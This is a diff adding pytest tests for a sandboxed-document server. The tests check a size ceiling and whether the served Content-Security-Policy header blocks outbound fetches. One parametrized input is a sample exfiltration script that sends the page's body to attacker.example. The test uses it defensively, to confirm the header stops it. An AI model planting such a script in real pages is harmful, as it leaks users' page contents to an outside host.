@@ -359,6 +359,33 @@ async def test_a_minted_document_is_served_once_and_then_gone() -> None:
 
 
 @pytest.mark.asyncio
+async def test_a_dashboard_page_at_the_frames_ceiling_fits_one_document() -> None:
+    """The frame measures the PAGE; this stash holds the whole DOCUMENT built from it.
+
+    The dashboard tab mints its frame through here, so a page the frame accepts must
+    also be a document this stash takes with a large data island beside it. The page
+    sits at ``dashboard_frame.MAX_PAGE_BYTES`` and is composed with an island of
+    ``MAX_MODEL_FIELDS`` fields of ``MAX_ENTRY_BYTES`` each, 4 MiB: one crew-log entry
+    in every field. An island has no bound of its own, so this is a size the stash is
+    built for, not the most a page can be given. The browser wrapper around the
+    document (``buildSrcdoc``: a few KB) is allowed 64 KiB.
+    """
+    from kiro_crew import dashboard_frame
+    from kiro_crew.artifact_store.dashboard_package import MAX_MODEL_FIELDS
+    from kiro_crew.crew_log.schema import MAX_ENTRY_BYTES
+
+    head, tail = '<div id="scene"></div><script>', "</script>"
+    page = head + "x" * (dashboard_frame.MAX_PAGE_BYTES - len(head) - len(tail)) + tail
+    fields = {f"series_{i}": "y" * MAX_ENTRY_BYTES for i in range(MAX_MODEL_FIELDS)}
+    read = dashboard_frame.read_payload(fields)
+    document = dashboard_frame.compose_body(page, read) + "<!--" + "w" * (64 * 1024) + "-->"
+    assert len(document.encode("utf-8")) > 4 * 1024 * 1024, "the old 4 MiB stash would refuse it"
+    doc_id, token = await _mint(document)
+    served = await sd.serve_sandbox_doc(_serve_req(doc_id, token))
+    assert served.body == document.encode("utf-8")
+
+
+@pytest.mark.asyncio
 async def test_the_served_response_carries_the_sandbox_headers() -> None:
     """Asserted on the RESPONSE, not on the source line that sets it."""
     doc_id, token = await _mint("<p>hi</p>")
@@ -443,6 +470,56 @@ async def test_an_injecting_or_inexpressible_ancestor_cannot_reach_the_header(
     assert "frame-ancestors 'self' http://localhost:5476" in csp
     assert "script-src" not in csp
     assert "[::1]" not in csp
+
+
+def _directives(csp: str) -> dict[str, str]:
+    """Parse a CSP header into ``{directive: value}`` (first occurrence wins, as in browsers)."""
+    out: dict[str, str] = {}
+    for part in csp.split(";"):
+        name, _, value = part.strip().partition(" ")
+        if name and name.lower() not in out:
+            out[name.lower()] = value.strip()
+    return out
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "html",
+    [
+        "<p>hi</p>",
+        # A document that ships NO meta CSP of its own: the header alone must hold.
+        "<script>fetch('https://attacker.example/x?d='+document.body.innerHTML)</script>",
+        # A document whose own meta CSP tries to grant network back: a meta policy
+        # can only add restrictions on top of the header, never lift them.
+        '<meta http-equiv="Content-Security-Policy" content="connect-src *"><p>x</p>',
+    ],
+)
+async def test_the_served_csp_blocks_outbound_fetch_directives(html: str) -> None:
+    """The served header blocks connect-class requests on its own.
+
+    ``sandbox`` without ``allow-same-origin`` keeps the document off the dashboard
+    origin, but without fetch directives its script could still fetch/WebSocket/
+    beacon what it holds to any host. Asserted on the parsed RESPONSE header. The
+    header does not depend on the body; the html cases pin that it stays fixed
+    for a document with no meta CSP and one whose meta CSP asks for more (how the
+    browser intersects the two policies is not exercised here).
+    """
+    doc_id, token = await _mint(html)
+    resp = await sd.serve_sandbox_doc(_serve_req(doc_id, token))
+    d = _directives(resp.headers["Content-Security-Policy"])
+
+    for name in ("connect-src", "object-src", "base-uri", "form-action"):
+        assert d.get(name) == "'none'", f"{name} is {d.get(name)!r}, expected 'none'"
+    flags = d["sandbox"].split()
+    assert "allow-scripts" in flags
+    assert "allow-same-origin" not in flags, "the document would share the dashboard origin"
+    # Widgets keep loading CDN libraries, styles, images and fonts: the header must
+    # not set a default-src or a source directive that would silently cut those off.
+    for name in ("default-src", "script-src", "style-src", "img-src", "font-src"):
+        assert name not in d, f"{name} on the header would break existing widgets"
+    assert d["frame-ancestors"].startswith("'self'")
+    for name in ("report-uri", "report-to"):
+        assert name not in d, f"{name} would ship violation reports to an endpoint"
 
 
 @pytest.mark.asyncio
